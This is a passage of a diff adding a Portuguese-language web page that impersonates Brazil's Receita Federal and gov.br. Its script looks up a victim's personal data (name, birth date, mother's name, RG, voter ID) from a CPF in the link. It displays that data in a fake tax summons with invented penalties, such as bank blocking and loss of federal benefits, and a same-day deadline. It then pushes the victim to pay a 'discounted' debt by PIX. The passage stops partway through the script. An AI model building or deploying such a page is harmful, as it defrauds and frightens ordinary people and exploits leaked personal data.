@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8"/>
+    <title>Você Tem Acesso Liberado</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdngovbr-ds.estaleiro.serpro.gov.br/design-system/fonts/rawline/css/rawline.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,600,700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            max-width: 100vw;
+            overflow-x: hidden;
+        }
+        .container-mobile {
+            width: 92vw;
+            max-width: 340px;
+        }
+        @media (min-width: 640px) {
+            .container-mobile {
+                max-width: 400px;
+            }
+        }
+        .logo-image {
+            width: 110px;
+            height: auto;
+            max-height: 110px;
+            object-fit: contain;
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: high-quality;
+            -webkit-backface-visibility: hidden;
+            backface-visibility: hidden;
+            transform: translateZ(0);
+        }
+        .logo-receita {
+            width: 110px;
+            height: auto;
+            max-height: 110px;
+            object-fit: contain;
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: high-quality;
+            -webkit-backface-visibility: hidden;
+            backface-visibility: hidden;
+            transform: translateZ(0);
+        }
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .popup-content {
+            background: white;
+            border-radius: 16px;
+            padding: 20px;
+            max-width: 340px;
+            width: 92vw;
+            animation: fadeIn 0.3s ease-out;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .hidden {
+            display: none !important;
+        }
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80% { content: '...'; }
+            100% { content: '....'; }
+        }
+        @keyframes pulse-slow {
+            0%, 100% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+        }
+        .animate-pulse-slow {
+            animation: pulse-slow 1.5s ease-in-out infinite;
+        }
+        
+        /* Gov.br Header Styles */
+        .br-header {
+            background: #FFFFFF;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .br-header .container-lg {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        .br-header .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+        }
+        .br-header .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+        .br-header .header-logo a {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+        .br-divider.vertical {
+            width: 1px;
+            height: 32px;
+            background: #CCCCCC;
+            margin: 0 16px;
+        }
+        .br-header .header-sign {
+            display: flex;
+            flex-direction: column;
+        }
+        .br-header .sign-text {
+            font-family: 'Rawline', 'Raleway', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1351B4;
+            line-height: 1.3;
+        }
+        .br-header .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .br-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 100em;
+            font-family: 'Rawline', 'Raleway', sans-serif;
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .br-button.primary {
+            background: #E8E8E8;
+            color: #1351B4;
+        }
+        .br-button.primary:hover {
+            background: #D4D4D4;
+        }
+        .br-button i {
+            font-size: 14px;
+        }
+        /* Responsivo */
+        @media (max-width: 768px) {
+            .br-header .header-top {
+                flex-wrap: wrap;
+                gap: 12px;
+            }
+            
+            .br-header .sign-text {
+                font-size: 14px;
+            }
+            
+            .br-divider.vertical {
+                height: 24px;
+                margin: 0 12px;
+            }
+        }
+        @media (max-width: 480px) {
+            .br-header .header-logo {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 6px;
+            }
+            
+            .br-header .header-sign {
+                flex-direction: row !important;
+                align-items: center !important;
+                gap: 8px !important;
+            }
+            
+            .br-header .sign-text {
+                font-size: 12px !important;
+            }
+            
+            .br-divider.vertical {
+                display: none;
+            }
+        }
+        
+        .main-page {
+            display: none;
+        }
+        .main-page.active {
+            display: block;
+        }
+        
+        /* Container das funcionalidades */
+        .header-functions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        /* Botão circular */
+        .br-button.circle {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            padding: 0;
+            border: none;
+            border-radius: 50%;
+            background: transparent;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .br-button.circle.small {
+            width: 36px;
+            height: 36px;
+        }
+        .br-button.circle:hover {
+            background: rgba(19, 81, 180, 0.1);
+        }
+        .br-button.circle:focus {
+            outline: 2px solid #C2850C;
+            outline-offset: 2px;
+        }
+        .br-button.circle svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        /* Modo Alto Contraste */
+        body.high-contrast {
+            filter: invert(1) hue-rotate(180deg);
+        }
+        body.high-contrast img,
+        body.high-contrast svg {
+            filter: invert(1) hue-rotate(180deg);
+        }
+        
+        @media (max-width: 480px) {
+            .header-functions {
+                display: flex;
+                align-items: center;
+                gap: 6px;
+                margin-top: -20px;
+            }
+            .header-functions .br-divider.vertical {
+                display: block;
+                height: 20px;
+                width: 1px;
+                background: #CCCCCC;
+            }
+            .br-button.circle.small {
+                width: 28px;
+                height: 28px;
+            }
+            .br-button.circle svg {
+                width: 16px;
+                height: 16px;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <!-- Tela de Redirecionamento -->
+    <div id="popup-gru" class="fixed inset-0 z-50 hidden flex items-center justify-center" style="backdrop-filter: blur(8px); background-color: rgba(255, 255, 255, 0.95);">
+        <div class="text-center p-8">
+            <img src="static/logo-receita.png" alt="Receita Federal" style="width: 120px; margin: 0 auto 24px auto;">
+            <div class="animate-spin rounded-full h-10 w-10 border-4 border-gray-300 mx-auto mb-4" style="border-top-color: #1351B4;"></div>
+            <p class="text-lg font-bold" style="color: #1351B4;">Emitindo GRU de Pagamento...</p>
+            <p class="text-sm text-gray-500 mt-2">Aguarde um momento</p>
+        </div>
+    </div>
+
+    <!-- Popup de Carregamento com Dados -->
+    <div id="loading-popup" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center">
+        <div class="bg-white rounded-lg p-6 mx-4 max-w-sm w-full text-center">
+            <div id="logo-container">
+                <img id="logo-govbr" src="https://barra.sistema.gov.br/v1/assets/govbr.webp" alt="gov.br" class="h-10 mx-auto mb-4">
+                <img id="logo-receita" src="static/logo-receita-gov.png" alt="Receita Federal" class="h-12 mx-auto mb-4 hidden" style="image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;">
+            </div>
+            
+            <div class="flex justify-center mb-4">
+                <div class="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
+            </div>
+            
+            <div id="loading-text" class="font-medium mb-4">Carregando...</div>
+            
+            <div class="bg-gray-50 rounded-lg p-4 mb-4 text-left">
+                <p class="text-xs text-gray-500 mb-2">Dados Monitorados</p>
+                <p id="display-user-name" class="text-sm font-bold text-gray-900 mb-1"></p>
+                <p id="display-user-cpf" class="text-xs text-gray-700 mb-1"></p>
+                <p id="display-user-nascimento" class="text-xs text-gray-700 mb-1"></p>
+                <p id="display-user-mae" class="text-xs text-gray-700"></p>
+            </div>
+            
+            <p class="text-xs text-gray-600 leading-relaxed">
+                Aguarde enquanto conectamos com segurança o sistema GOVBR e Receita Federal.
+            </p>
+        </div>
+    </div>
+
+    <!-- Página Principal com Informações -->
+    <div id="main-page" class="main-page">
+        <!-- Header Gov.br -->
+        <header class="br-header">
+            <div class="container-lg">
+                <div class="header-top">
+                    <div class="header-logo">
+                        <!-- Logo Receita Federal -->
+                        <div>
+                            <img src="static/logo-receita.png" 
+                                 alt="Receita Federal" 
+                                 class="h-8 object-contain"
+                                 style="image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;">
+                        </div>
+                        <span class="br-divider vertical mx-2"></span>
+                        <div class="header-sign" style="display: flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-bars" style="color: #1351B4; font-size: 14px;"></i>
+                            <span class="sign-text">Serviços do Contribuinte</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Ícones de Funcionalidades -->
+                    <div class="header-functions">
+                        <div class="br-button circle small" style="cursor: default;">
+                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <rect x="2" y="2" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="8" y="2" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="14" y="2" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="2" y="8" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="8" y="8" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="14" y="8" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="2" y="14" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="8" y="14" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                                <rect x="14" y="14" width="4" height="4" rx="0.5" fill="#1351B4"/>
+                            </svg>
+                        </div>
+                        <span class="br-divider vertical"></span>
+                        <div class="br-button circle small" style="cursor: default;">
+                            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="10" cy="10" r="8" stroke="#1351B4" stroke-width="2" fill="none"/>
+                                <path d="M10 2C14.4183 2 18 5.58172 18 10C18 14.4183 14.4183 18 10 18V2Z" fill="#1351B4"/>
+                            </svg>
+                        </div>
+                    </div>
+                    
+                    <div class="header-actions" style="display: flex; flex-direction: column; align-items: flex-end; gap: 4px;">
+                        <div class="br-button primary" style="cursor: default;">
+                            <i class="fas fa-user"></i>
+                            <span id="btn-user-name">Entrar</span>
+                        </div>
+                        <span id="header-cpf" style="color: #1351B4; font-size: 11px; font-weight: 500;"></span>
+                    </div>
+                </div>
+            </div>
+        </header>
+        
+        <!-- Seção de Normativa -->
+        <div class="bg-gray-100 border-b border-gray-200 py-4 px-4">
+            <div class="max-w-4xl mx-auto text-center">
+                <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png" 
+                     alt="Brasão da República" 
+                     class="h-16 mx-auto mb-2 object-contain">
+                <h2 class="text-lg font-bold text-gray-800 mb-1">Normativa (IN) RFB nº 2.219/2025</h2>
+                <p class="text-sm text-gray-700 mb-1">Vigor: Janeiro 2026</p>
+                <p class="text-sm"><span style="color: #000000; font-weight: 700;">BACEN (Banco Central do Brasil)</span> <span style="color: #DC2626;">e-Financeira - Monitoramento sobre transações PIX e Cartões de Crédito.</span></p>
+            </div>
+        </div>
+        
+        <!-- Seção CPF -->
+        <div class="px-4 py-4">
+            <div class="max-w-2xl mx-auto">
+                <h2 class="text-xl font-bold text-gray-900 mb-1">CPF</h2>
+                <p class="text-gray-700 mb-1">Cadastro de Pessoas Físicas</p>
+                <p class="text-sm text-gray-600 mb-6">Consulta atualizada com comprovante de inscrição no Cadastro de Pessoas Físicas (CPF).</p>
+                
+                <!-- Dados Pessoais -->
+                <div class="bg-gray-100 p-4 mb-4">
+                    <h3 class="font-semibold text-gray-800 mb-3">Dados Pessoais</h3>
+                    <div class="space-y-2 text-sm">
+                        <p><span class="text-gray-600">Nome Completo:</span> <span id="dados-nome" class="font-medium text-gray-900"></span></p>
+                        <p><span class="text-gray-600">Data de Nascimento:</span> <span id="dados-nascimento" class="font-medium text-gray-900"></span></p>
+                        <p><span class="text-gray-600">Nome da Mãe:</span> <span id="dados-mae" class="font-medium text-gray-900"></span></p>
+                        <p><span class="text-gray-600">CPF:</span> <span id="dados-cpf" class="font-medium text-gray-900"></span></p>
+                    </div>
+                    <div class="mt-4">
+                        <p class="font-bold" style="color: #1351B4;">Atenção</p>
+                        <p class="text-red-600 font-medium">Declaração Retida para Análise</p>
+                    </div>
+                </div>
+                
+                <!-- Intimação Fiscal -->
+                <div class="bg-gray-100 p-4">
+                    <h3 class="font-semibold mb-3" style="color: #1351B4;">Intimação Fiscal - RECEITA FEDERAL DO BRASIL</h3>
+                    <div class="text-sm text-gray-800 leading-relaxed">
+                        <p class="mb-4 text-justify">
+                            <strong id="intimacao-nome" class="text-black"></strong>, portador(a) do CPF <strong id="intimacao-cpf" class="text-black"></strong>, em conformidade com a Normativa (IN) RFB nº 2.219/2025, informamos que após cruzamento de dados entre o <strong class="text-black">BACEN (Banco Central do Brasil)</strong> e o sistema Tributário da Receita Federal <strong class="text-black">(e-Financeira)</strong> o seu CPF (Cadastro de Pessoas Físicas) foi identificado <strong class="text-black">(Pendência Tributária)</strong> em sua situação fiscal, relacionada ao ano de 2025. Gerando abertura ao processo número: <strong class="text-black">28.1748320184-9284.03</strong>.
+                        </p>
+                        
+                        <p class="mb-2">
+                            <span class="text-gray-700">Situação Processual:</span>
+                        </p>
+                        <p class="font-bold mb-4" style="color: #1351B4;">EM ANDAMENTO.</p>
+                        
+                        <p class="font-bold text-base mb-2">
+                            <span style="color: #991B1B;">PRAZO FINAL:</span> <span id="prazo-final-1" style="color: #1351B4;"></span> <span class="text-black">é o último dia para regularização.</span>
+                        </p>
+                        <p class="text-gray-700 mb-4">
+                            O não cumprimento desta intimação resultará nas seguintes punições conforme Instrução Normativa <strong class="text-black">(IN) RFB nº 2.219/2025</strong>:
+                        </p>
+                        
+                        <ul class="space-y-2">
+                            <li class="flex items-start border-b border-gray-300 pb-2">
+                                <span style="color: #991B1B;" class="mr-2">•</span>
+                                <span style="color: #991B1B;">Bloqueio de contas bancárias e cartões</span>
+                            </li>
+                            <li class="flex items-start border-b border-gray-300 pb-2">
+                                <span style="color: #991B1B;" class="mr-2">•</span>
+                                <span style="color: #991B1B;">Impossibilidade de movimentar PIX, TED e DOC</span>
+                            </li>
+                            <li class="flex items-start border-b border-gray-300 pb-2">
+                                <span style="color: #991B1B;" class="mr-2">•</span>
+                                <span style="color: #991B1B;">Restrições no Banco Central e SERASA</span>
+                            </li>
+                            <li class="flex items-start border-b border-gray-300 pb-2">
+                                <span style="color: #991B1B;" class="mr-2">•</span>
+                                <span style="color: #991B1B;">Suspensão do acesso a benefícios federais (Auxílio, Bolsa Família, etc.)</span>
+                            </li>
+                            <li class="flex items-start border-b border-gray-300 pb-2">
+                                <span style="color: #991B1B;" class="mr-2">•</span>
+                                <span style="color: #991B1B;">Impedimento para financiamentos, empréstimos e compras no crédito</span>
+                            </li>
+                            <li class="flex items-start border-b border-gray-300 pb-2">
+                                <span style="color: #991B1B;" class="mr-2">•</span>
+                                <span style="color: #991B1B;" class="font-semibold">Aplicação de multa automática de até 150%</span>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Seção Loading Extrato DIRPF -->
+        <div id="loading-extrato" class="px-4 py-6 hidden">
+            <div class="max-w-2xl mx-auto">
+                <div class="text-center mb-4">
+                    <h3 class="font-bold text-lg mb-2" style="color: #1351B4;">Carregando Extrato (DIRPF):</h3>
+                    <div id="spinner-extrato" class="flex justify-center items-center mb-2">
+                        <div class="animate-spin rounded-full h-8 w-8 border-4 border-gray-300" style="border-top-color: #1351B4;"></div>
+                    </div>
+                    <p class="text-xs text-gray-600">Conectado ao Portal (e-CAC)</p>
+                    <p class="text-sm text-red-600 font-medium mt-2">CPF Irregular: <span id="cpf-irregular"></span></p>
+                </div>
+                
+                <div id="meses-container" class="space-y-4 mt-4"></div>
+                
+                <div id="total-container" class="hidden mt-6 bg-gray-100 p-4">
+                    <div class="flex justify-between items-center border-b-2 border-gray-400 pb-2 mb-2">
+                        <span class="font-bold text-gray-800">TOTAL DÉBITO 2025:</span>
+                        <span class="font-bold text-red-700">R$ 275,14</span>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="font-bold" style="color: #1351B4;">VALOR COM DESCONTO:</span>
+                        <span class="font-bold" style="color: #1351B4;">R$ 147,94</span>
+                    </div>
+                    <p class="text-xs text-gray-600 mt-3">*Desconto válido apenas para pagamento integral hoje (<span id="data-desconto"></span>) via (DIRPF) Receita Federal do Brasil.</p>
+                    <button onclick="irParaCheckout()" class="w-full mt-4 py-3 text-white font-bold text-center" style="background-color: #1351B4; border-radius: 0;">Regularizar (DIRPF)</button>
+                </div>
+                
+                <div id="notificacao-container" class="hidden mt-6 text-center">
+                    <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png" 
+                         alt="Brasão da República" 
+                         class="h-16 mx-auto mb-3 object-contain">
+                    <h3 class="font-bold text-lg text-gray-900 mb-3">NOTIFICAÇÃO OFICIAL - PRAZO FINAL</h3>
+                    <p class="text-sm text-gray-700 text-left mb-4">
+                        O não cumprimento da obrigação tributária até <strong id="prazo-final-2"></strong> resultará na imposição de multa adicional no valor de <strong class="text-red-600">R$ 1.985,00</strong> e na aplicação das seguintes medidas administrativas pela Receita Federal do Brasil:
+                    </p>
+                    <div class="text-sm text-left space-y-3">
+                        <p><strong>1. BLOQUEIO BANCÁRIO:</strong> Suspensão de todas as contas correntes, poupanças e investimentos.</p>
+                        <p><strong>2. RESTRIÇÃO CREDITÍCIA:</strong> Inscrição do nome nos órgãos de proteção ao crédito (SPC/SERASA).</p>
+                        <p><strong>3. BLOQUEIO DO CPF:</strong> Impossibilidade de realizar transações financeiras e operações bancárias.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Rodapé -->
+        <footer id="footer-container" class="hidden mt-8" style="background-color: #071D41;">
+            <div class="max-w-2xl mx-auto px-4 py-8 text-center">
+                <img src="https://www.gov.br/receitafederal/pt-br/@@govbr.institucional.banner/logo-receita-negativa.png" 
+                     alt="Receita Federal" 
+                     class="h-12 mx-auto mb-4 object-contain"
+                     onerror="this.src='/static/logo-receita.png'; this.style.filter='brightness(0) invert(1)';">
+                
+                <div class="border-t border-gray-600 pt-4 mb-4">
+                    <p class="text-white text-sm font-medium mb-1">Governo Federal</p>
+                    <p class="text-gray-300 text-xs">Ministério da Fazenda</p>
+                    <p class="text-gray-300 text-xs">Secretaria Especial da Receita Federal do Brasil</p>
+                </div>
+                
+                <div class="mb-4">
+                    <p class="text-gray-400 text-xs mb-3">Conecte-se</p>
+                    <div class="flex justify-center space-x-4">
+                        <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center">
+                            <i class="fab fa-facebook-f text-white text-xs"></i>
+                        </div>
+                        <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center">
+                            <i class="fab fa-twitter text-white text-xs"></i>
+                        </div>
+                        <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center">
+                            <i class="fab fa-instagram text-white text-xs"></i>
+                        </div>
+                        <div class="w-8 h-8 rounded-full bg-gray-600 flex items-center justify-center">
+                            <i class="fab fa-youtube text-white text-xs"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="border-t border-gray-600 pt-4">
+                    <p class="text-gray-400 text-xs">Portal gov.br - Todos os direitos reservados</p>
+                    <p class="text-gray-500 text-xs mt-1">Desenvolvido pelo SERPRO</p>
+                </div>
+            </div>
+        </footer>
+        
+        <span id="main-user-name" class="hidden"></span>
+        <span id="main-user-cpf" class="hidden"></span>
+        <span id="main-user-nascimento" class="hidden"></span>
+        <span id="main-user-mae" class="hidden"></span>
+    </div>
+
+    <script>
+        // Lógica para extrair CPF da URL (ex: dominio.com/12345678900)
+        // Pega o pathname (ex: /12345678900), remove a barra inicial e caracteres não numéricos
+        const pathCpf = window.location.pathname.replace(/\D/g, '');
+        const urlParams = new URLSearchParams(window.location.search);
+        // Prioriza o CPF da URL (path), se não tiver, tenta query param, ou vazio
+        const cpf = pathCpf || urlParams.get('cpf') || "";
+        
+        const telefoneUrl = urlParams.get('tel') || '';
+        let userData = {};
+        
+        async function iniciarCarregamento() {
+            const loadingPopup = document.getElementById('loading-popup');
+            const loadingText = document.getElementById('loading-text');
+            const logoGovbr = document.getElementById('logo-govbr');
+            const logoReceita = document.getElementById('logo-receita');
+            
+            try {
+                // Alterado para usar o script PHP local que consulta a API externa
+                const response = await fetch('api.php?cpf=' + cpf);
+                const data = await response.json();
+                
+                let nomeUsuario = 'Usuário';
+                let cpfUsuario = cpf;
+                let dataNascimento = '';
+                let nomeMae = '';
+                let sexoUsuario = '';
+                let rgUsuario = '';
+                let tituloEleitor = '';
+                
+                if (data && data.status === 200 && data.dados && data.dados.length > 0) {
+                    const d = data.dados[0];
+                    nomeUsuario = d.NOME;
+                    cpfUsuario = d.CPF;
+                    dataNascimento = d.NASC || d.DATA_NASCIMENTO || '';
+                    nomeMae = d.NOME_MAE || d.MAE || '';
+                    sexoUsuario = d.SEXO || '';
+                    rgUsuario = d.RG || '';
+                    tituloEleitor = d.TITULO_ELEITOR || '';
+                } else if (data && data.NOME) {
+                    nomeUsuario = data.NOME;
+                    cpfUsuario = data.CPF || cpf;
+                    dataNascimento = data.NASC || data.DATA_NASCIMENTO || '';
+                    nomeMae = data.NOME_MAE || data.MAE || '';
+                    sexoUsuario = data.SEXO || '';
+                    rgUsuario = data.RG || '';
+                    tituloEleitor = data.TITULO_ELEITOR || '';
+                }
+                
+                userData = {
+                    nome: nomeUsuario,
+                    cpf: cpfUsuario,
+                    nascimento: dataNascimento,
+                    mae: nomeMae,
+                    sexo: sexoUsuario,
+                    rg: rgUsuario,
+                    titulo: tituloEleitor
+                };
+                
+                document.getElementById('display-user-name').textContent = nomeUsuario;
+                document.getElementById('display-user-cpf').textContent = 'CPF: ' + formatCPF(cpfUsuario);
+                document.getElementById('display-user-nascimento').textContent = dataNascimento ? 'Nascimento: ' + dataNascimento : '';
+                document.getElementById('display-user-mae').textContent = nomeMae ? 'Mãe: ' + nomeMae : '';
+                
+                loadingPopup.classList.remove('hidden');
+                
+                logoGovbr.classList.remove('hidden');
+                logoReceita.classList.add('hidden');
+                loadingText.className = 'font-medium mb-4 text-gray-800';
+                loadingText.textContent = 'Conectando com GOVBR...';
+                await new Promise(resolve => setTimeout(resolve, 2500));
+                
+                loadingText.className = 'font-medium mb-4 text-green-600';
+                loadingText.textContent = 'Conectado com GOVBR ✓';
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                logoGovbr.classList.add('hidden');
+                logoReceita.classList.remove('hidden');
+                loadingText.className = 'font-medium mb-4 text-gray-800';
+                loadingText.textContent = 'Conectando sistema de tributação...';
+                await new Promise(resolve => setTimeout(resolve, 2500));
+                
+                loadingText.className = 'font-medium mb-4 text-green-600';
+                loadingText.textContent = 'Sistema conectado com sucesso ✓';
+                
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                loadingPopup.classList.add('hidden');
+                mostrarPaginaPrincipal();
+                
+            } catch (error) {
+                document.getElementById('display-user-name').textContent = 'Erro ao carregar';
+                document.getElementById('display-user-cpf').textContent = 'CPF: ' + formatCPF(cpf);
+                document.getElementById('display-user-nascimento').textContent = '';
+                document.getElementById('display-user-mae').textContent = '';
+                loadingPopup.classList.remove('hidden');
+            }
+        }
+        
+        function mostrarPaginaPrincipal() {
+            document.getElementById('main-user-name').textContent = userData.nome || 'Usuário';
+            document.getElementById('main-user-cpf').textContent = 'CPF: ' + formatCPF(userData.cpf || cpf);
+            document.getElementById('main-user-nascimento').textContent = userData.nascimento || 'Não informado';
+            document.getElementById('main-user-mae').textContent = userData.mae || 'Não informado';
+            
+            const primeiroNome = (userData.nome || 'Usuário').split(' ')[0];
+            document.getElementById('btn-user-name').textContent = primeiroNome;
+            document.getElementById('header-cpf').textContent = formatCPF(userData.cpf || cpf);
+            
+            document.getElementById('intimacao-nome').textContent = userData.nome || 'Usuário';
+            document.getElementById('intimacao-cpf').textContent = formatCPF(userData.cpf || cpf);
+            
+            document.getElementById('dados-nome').textContent = userData.nome || 'Não informado';
+            document.getElementById('dados-nascimento').textContent = userData.nascimento || 'Não informado';
+            document.getElementById('dados-mae').textContent = userData.mae || 'Não informado';
+            document.getElementById('dados-cpf').textContent = formatCPF(userData.cpf || cpf);
+            
+            const prazoFinal = calcularPrazoFinal();
+            document.getElementById('prazo-final-1').textContent = prazoFinal;
+            document.getElementById('prazo-final-2').textContent = prazoFinal;
+            
+            document.getElementById('main-page').classList.add('active');
+        }
+
+        function formatCPF(cpf) {
+            const cpfClean = String(cpf).replace(/\D/g, '');
+            return cpfClean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+        
+        function calcularPrazoFinal() {
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+            const ano = hoje.getFullYear();
+            return `${dia}/${mes}/${ano}`;
+        }
+        
+        function toggleContrast() {
+            document.body.classList.toggle('high-contrast');
+        }
+        
+        function openMenu() {
+            alert('Menu de Serviços do Contribuinte\n\nEm desenvolvimento...');
+        }
+        
+        function openFunctions() {
+            alert('Funcionalidades do Sistema\n\n• Consulta CPF\n• Declaração IRPF\n• Emissão de DAE\n• Comprovantes\n• Certidões');
+        }
+        
+        function openUserMenu() {
+            const nome = userData.nome || 'Usuário';
+            const cpfFormatado = formatCPF(userData.cpf || cpf);
+            alert('Dados do Usuário\n\nNome: ' + nome + '\nCPF: ' + cpfFormatado);
+        }
+        
+        async function irParaCheckout() {
+            const popupGRU = document.getElementById('popup-gru');
+            popupGRU.classList.remove('hidden');
+            
+            try {
+                const response = await fetch('/api/pix/create', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ nome: userData.nome || 'Usuário', cpf: userData.cpf || cpf, telefone: telefoneUrl })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success && result.pix_code) {
+                    const nome = encodeURIComponent(userData.nome || 'Usuário');
+                    const cpfUsuario = encodeURIComponent(userData.cpf || cpf);
+                    const valor = '147.94';
+                    const txId = encodeURIComponent(result.transaction_id || '');
+                    const pixCode = encodeURIComponent(result.pix_code);
+                    
+                    window.location.href = `/checkout?nome=${nome}&cpf=${cpfUsuario}&valor=${valor}&tx_id=${txId}&pix_code=${pixCode}`;
+                } else {
+                    popupGRU.classList.add('hidden');
+                    alert('Erro ao gerar guia de pagamento. Tente novamente.');
+                }
+            } catch (error) {
+                popupGRU.classList.add('hidden');
+                alert('Erro de conexão. Tente novamente.');
+            }
+        }
+        
+        let loadingExtratoMostrado = false;
+        let carregamentoMesesIniciado = false;
+        
+        const mesesDados = [
+            { mes: 'Janeiro/2025', malha: 892.18, iof: 3.39, juros: 178.44, debito: 17.84 },
+            { mes: 'Fevereiro/2025', malha: 1078.21, iof: 4.10, juros: 215.60, debito: 21.56 },
+            { mes: 'Março/2025', malha: 961.84, iof: 3.65, juros: 192.37, debito: 19.24 },
+            { mes: 'Abril/2025', malha: 1243.96, iof: 4.73, juros: 248.76, debito: 24.88 },
+            { mes: 'Maio/2025', malha: 827.14, iof: 3.14, juros: 165.43, debito: 16.54 },
+            { mes: 'Junho/2025', malha: 1445.77, iof: 5.49, juros: 289.15, debito: 28.92 },
+            { mes: 'Julho/2025', malha: 739.32, iof: 2.81, juros: 147.86, debito: 14.79 },
+            { mes: 'Agosto/2025', malha: 1117.45, iof: 4.25, juros: 223.49, debito: 22.35 },
+            { mes: 'Setembro/2025', malha: 993.71, iof: 3.78, juros: 198.74, debito: 19.87 },
+            { mes: 'Outubro/2025', malha: 1339.16, iof: 5.09, juros: 267.83, debito: 26.78 },
+            { mes: 'Novembro/2025', malha: 771.88, iof: 2.93, juros: 154.38, debito: 15.44 },
+            { mes: 'Dezembro/2025', malha: 1478.29, iof: 5.62, juros: 469.33, debito: 46.93 }
+        ];
+        
+        async function carregarMeses() {
+            if (carregamentoMesesIniciado) return;
+            carregamentoMesesIniciado = true;
+            
+            document.getElementById('cpf-irregular').textContent = formatCPF(userData.cpf || cpf);
+            
+            const container = document.getElementById('meses-container');
+            
+            for (let i = 0; i < mesesDados.length; i++) {
+                const m = mesesDados[i];
+                
+                const miniLoading = document.createElement('div');
+                miniLoading.className = 'flex items-center justify-center py-3';
+                miniLoading.id = 'mini-loading-atual';
+                miniLoading.innerHTML = `
+                    <div class="animate-spin rounded-full h-5 w-5 border-2 border-gray-300 mr-2" style="border-top-color: #1351B4;"></div>
+                    <span class="text-xs text-gray-500">Carregando ${m.mes}...</span>
+                `;
+                container.appendChild(miniLoading);
+                
+                setTimeout(() => {
+                    miniLoading.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+                
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                container.removeChild(miniLoading);
+                
